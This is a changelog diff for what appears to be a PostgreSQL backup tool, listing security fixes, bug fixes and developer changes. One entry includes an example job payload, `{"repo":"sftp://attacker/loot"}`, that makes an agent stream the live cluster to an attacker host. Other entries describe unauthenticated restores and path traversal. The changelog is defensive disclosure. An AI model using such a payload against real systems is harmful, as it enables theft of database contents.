@@ -26,6 +26,41 @@ keeps reading that version for at least 24 months after a successor lands.
   this change still verifies, because the exporter has always written the
   matching fingerprint.
 
+- **A non-loopback control plane now refuses to start without
+  authentication.** `requireAuth` skipped bearer-token checking whenever no
+  token was configured — documented as "intended for behind-mTLS
+  deployments", but nothing enforced it. A server could therefore bind a
+  non-loopback address with plain TLS, no client-certificate verification
+  and no token, exposing deployment enumeration, job enqueue, and
+  `POST /v1/deployments/<n>/restores` with an arbitrary absolute
+  `target_dir` to anyone who could reach the port. A non-loopback `listen`
+  now requires either `auth.token_file` or `tls.client_ca_file`, checked in
+  the constructor so a misconfiguration fails at startup rather than on the
+  first request. Loopback is unchanged, so the out-of-box local CLI posture
+  still works. **Operators running a server-TLS-only, non-loopback
+  deployment must add one of the two before upgrading.**
+- **A job-supplied repo URL is only trusted against the agent's declared
+  repo.** All three executors fell back to the job's URL when the deployment
+  had none, and applied the cross-repo guard only when the deployment
+  declared one. A `wal stream`/doctor-only deployment therefore accepted any
+  control-plane-supplied repo: `{"repo":"sftp://attacker/loot"}` made the
+  agent take a fresh physical base backup and stream the live cluster into
+  it, with no local warning. The agent now refuses a job-supplied repo when
+  it has none configured, and the server rejects an off-allowlist repo with
+  `400 usage.bad_repo`.
+- **Repository credentials are redacted in deployment log lines.**
+- **Deployment names and backup IDs are validated at the REST boundary**
+  (F-0004), so a traversal name gets a clean `400` instead of a silent
+  `200` plus an empty list, and a hostile backup ID fails at the API rather
+  than deep inside the agent executor.
+- **`scp` path containment is checked by resolution, not by banning the
+  `..` substring** (F-0002). The old ban was escape-proof but over-strict:
+  `validateStorageID` permits dots in deployment names, so a deployment
+  called e.g. `db..prod` produced legal keys that `List`/`Delete` refused,
+  silently breaking every `scp://` repo for that deployment.
+- **Toolchain pinned to go1.26.6**, and `otel` → v1.44.0 / `x/net` →
+  v0.56.0.
+
 ### Fixed
 
 - **The audit-chain append loop can no longer spin forever.** `Store.Append`
@@ -54,6 +89,62 @@ keeps reading that version for at least 24 months after a successor lands.
   name — across every chunk, for the whole walk — only for the report to
   collapse them. Reported output is unchanged.
 
+- **`repo bundle import` rejected every chunk of every real bundle.** A
+  chunk key addresses the PLAINTEXT — `PutChunk` hashes the body, then
+  compresses (zstd by default) and optionally encrypts before storing —
+  while a bundle preserves the on-disk layout and therefore carries the
+  STORED bytes. Import hashed what was in the tar and compared it to the
+  key, which only agrees when the chunk was written with the `none` codec.
+  Since every repository compresses by default, the air-gap bundle feature
+  did not work at all. Import now decodes the envelope and verifies what the
+  key actually addresses; a chunk whose plaintext does not hash to its key
+  is still refused, so the anti-forgery guarantee is unchanged.
+- **A backup could adopt a chunk it cannot decrypt in a multi-KEK
+  repository.** The cross-DEK adopt guard probed once per CAS, on the
+  reasoning that readability is a property of `(repo, DEK)`. That holds for
+  a single-KEK repository and is false for a mixed one — which is exactly
+  what the guard defends, since per-tenant KEKs sharing a repo is a
+  supported configuration. A backup that adopted one of its own chunks first
+  resolved the guard OK, and every later adoption of another tenant's chunk
+  went unchecked: the manifest committed references to chunks the backup
+  cannot read, so it exited 0 and failed only at restore. The guard now
+  verifies the premise — one listing of the shared-DEK prefix — and checks
+  every adoption in a multi-KEK repo, leaving the single-KEK fast path and
+  its cost profile unchanged.
+- **GCS answered "object missing" only at open, never mid-stream.** The
+  plugin mapped `ErrObjectNotExist` to `storage.ErrNotFound` when opening a
+  reader, but the client can also report it from the BODY read when an
+  object is deleted between open and pull. The raw client error then escaped
+  the plugin and every caller keyed on `ErrNotFound` stopped recognising a
+  plain missing object — including `Lease.Acquire`, whose
+  released-between-put-and-read retry never fired on GCS, turning a routine
+  concurrent lease release into a failed backup.
+- **`logs --since 24h` was rejected by journalctl.** The flag is documented
+  as `DUR-OR-TS` with `"24h"` as its first example, and the value was passed
+  through untouched; systemd requires a sign on a relative time, so the most
+  obvious way to use the flag failed with a generic `internal` error. A bare
+  duration is now negated ("that long ago"); every other spelling
+  (`yesterday`, `1 hour ago`, absolute timestamps, already-signed values)
+  passes through unchanged.
+- **`backup` no longer panics when the wall clock steps backwards.** A
+  backward NTP step or VM suspend/resume between two lease renewals made
+  `now+ttl` fall at or before the stored expiry, tripping an invariant that
+  killed the agent mid-backup. A renewal that cannot extend now keeps
+  holding without writing — the body would be byte-identical, so no
+  mutual-exclusion window narrows.
+- **A backup can no longer start from LSN 0 or an empty recptr.** Two
+  independent paths could produce a start LSN of zero when the LSN query
+  failed on a fresh no-slot start, or when `BASE_BACKUP` returned an empty
+  `recptr` (CORRUPT-1, CORRUPT-2). Both are refused.
+- **`.history` / `.backup` archive files get the same split-brain check
+  segment manifests already get**, so two clusters sharing a deployment name
+  can no longer overwrite each other's timeline history invisibly.
+- **Leaks:** an interrupted base backup tears down its open tablespace
+  (previously leaking the sink's parser goroutine and its pipe for the
+  process lifetime); the CAS adoption set is released after segment commit,
+  so a long-lived `wal stream` no longer grows it without bound; stale
+  agent-registry entries are pruned on heartbeat.
+
 ### Added
 
 - **`kms verify --require-encrypted`.** For a fleet whose policy is
@@ -80,6 +171,31 @@ keeps reading that version for at least 24 months after a successor lands.
   actually registered (AWS, GCP, Azure Key Vault, Vault Transit, PKCS#11,
   plus the local keyring) and states plainly that TPM-backed custody is not
   implemented.
+
+- **`logs` on a unit systemd does not know now exits 6 (`notfound.unit`)
+  instead of 0.** The previous detection keyed on journalctl exiting 1 for
+  "no entries", which real journalctl does not do — it exits 0 both for a
+  quiet unit and for one that does not exist, so the not-found branch was
+  unreachable and `logs --unit no-such-unit` returned success with no lines.
+  Existence is now decided by systemd (`LoadState`), and a unit that exists
+  but is merely quiet is still not an error. **Anything scripted against the
+  old exit 0 will see the change.**
+- **Performance.** WAL pruning reads manifests only for the prunable prefix
+  instead of every segment (binary search over ordering; over-pruning is
+  impossible by construction). The chunker's hot path no longer copies the
+  live tail after each chunk — a 4 MiB stream allocates ≤4 objects instead
+  of 285, with bit-identical boundaries. The adopted-chunk commit gate fans
+  out, the DEK-reuse manifest read is bounded, and `/readyz` caches its
+  probe for 30 s.
+- **CI workflows fire only on a `v*` tag push or manual dispatch**;
+  per-PR/per-push triggers and cron schedules were removed. The recommended
+  developer flow is `make ci` locally before tagging.
+- **New developer targets:** `make test-scenarios` runs the whole
+  174-scenario corpus (the previous target ran 12 of them, so the other 162
+  were wired into nothing and had drifted); `make test-scenarios-lint`
+  schema-checks all of them without Docker; `make test-stress` re-runs the
+  ordering-sensitive packages without `-race`; every test target now prints
+  the architecture it ran on.
 
 ## [1.2.4] — 2026-08-19
 
